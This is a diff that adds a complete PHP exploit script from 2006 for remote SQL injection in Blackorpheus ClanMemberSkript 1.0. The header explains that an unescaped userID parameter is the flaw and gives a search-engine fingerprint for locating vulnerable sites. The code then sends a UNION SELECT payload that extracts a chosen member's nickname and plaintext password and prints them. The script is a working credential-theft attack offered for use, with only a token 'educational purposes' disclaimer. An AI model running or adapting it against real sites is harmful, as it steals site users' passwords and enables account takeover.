@@ -1,0 +1,86 @@
+<?php /*
+
+ |---==============================================================---|
+ |                          /\¯\__       /\¯\                         |   
+ |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |    
+ |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |    
+ |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |     
+ |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |      
+ |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |     
+ |                                     >> Internet Security           |                         
+ |---==============================================================---|
+ 
+        title: Blackorpheus ClanMemberSkript 1.0 remote sql injection
+      release: 2006-04-16
+       author: snatcher [snatcher at gmx.ch]
+      country: switzerland  |+|
+	  
+  application: Blackorpheus ClanMemberSkript 1.0
+  description: a php / mysql based member management system
+     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=21
+  description: you can get each password with a simple sql injection. the password 
+               is plaintext :)
+  fingerprint: google -> "powered by ClanMemberSkript" -> 18
+       greets: honkey, str0ke <- good exploit publisher :),
+			   all security guys and coders over the world,
+ terms of use: this exploit is just for educational purposes, do not use it for illegal acts.
+
+
+---------------------------- member.php - line 7 -------------------------------------
+$result = MYSQL_QUERY(" SELECT * FROM $member_tab WHERE userID=$userID ");
+-----------------------------------------------------------------------------------------
+
+because this $userID isn't escaped correctly you can insert malicious sql code,
+i.e. with a union operator.
+
+
+*/
+
+/*********************** CONFIGURATION ****************************/
+
+$PATH_TO_FILE  = 'http://yourhost.com/member.php';                 // in example: http://yourhost.com/member.php
+$USER_ID       = 1;                                                // which user? default: 1
+$TABLE_PREFIX  = '';                                               // default: empty
+$GET_VARS      = '?userID=';                                       // do not change
+$SQL_INJECTION = '-666 union select 0,0,0,0,0,0,0,0,0,nick,pass,'. // do not change
+                 '0,0,0,0,0,0,0,0,0,0,0,0 from '.$TABLE_PREFIX.
+				 'membersettings where userID = '.$USER_ID.' limit 1/*';
+
+
+/**************************** MAIN ********************************/
+
+$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!'); 
+foreach ($file_array as $now)                               
+	$html_content .= $now;
+
+$html_content = str_castrate($html_content);
+
+preg_match_all("!Geburtsdatum:</font></td><tdwidth=\"50%\"><fontface=\"Verdana,Arial,Helvetica,sans".
+               "-serif\"size=\"2\">(.*?)</font>!",
+			   $html_content,$username); /* gets username */
+preg_match_all("!Wohnort:</font></td><tdwidth=\"50%\"><fontface=\"Verdana,Arial,Helvetica,sans-serif".
+               "\"size=\"2\">(.*?)</font>!", 
+                $html_content,$password); /* gets password */
+
+if ($username[1][0] && $password[1][0]) {
+	echo 'username: <b>'.$username[1][0].'</b><br>';
+	echo 'password: <b>'.$password[1][0].'</b>';
+}else {
+	echo 'exploit failed! <br>';
+}
+echo '<br><br><br><br><br>
+======================================================================<br>
+exploit: Blackorpheus ClanMemberSkript 1.0 remote sql injection<br>
+release: 2006-04-16<br>
+author: snatcher [snatcher at gmx.ch]<br>
+======================================================================';
+
+function str_castrate($string) {
+	$string = str_replace("\n", '', $string);
+	$string = str_replace("\r", '', $string);
+	$string = str_replace(" ", '', $string);
+	return $string;
+}
+?>
+
+# milw0rm.com [2006-04-16]
